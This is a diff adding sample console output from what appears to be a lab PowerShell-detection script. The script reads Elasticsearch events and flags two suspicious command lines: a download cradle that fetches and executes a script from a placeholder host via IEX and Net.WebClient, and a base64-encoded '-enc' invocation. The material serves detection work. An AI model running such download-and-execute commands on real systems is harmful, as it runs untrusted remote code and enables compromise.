@@ -1,1 +1,25 @@
+[OK] Connected to Elasticsearch
 
+[+] Found 10 PowerShell events
+
+====================================================
+
+Host: desktop-6ssgbr1
+User: labuser
+Process: powershell.exe
+
+Command Line:
+powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://test.com')"
+
+[ALERT] Suspicious PowerShell detected
+
+====================================================
+
+Host: desktop-6ssgbr1
+User: labuser
+Process: powershell.exe
+
+Command Line:
+powershell.exe -nop -enc aQBjAG0AZAA=
+
+[ALERT] Suspicious PowerShell detected
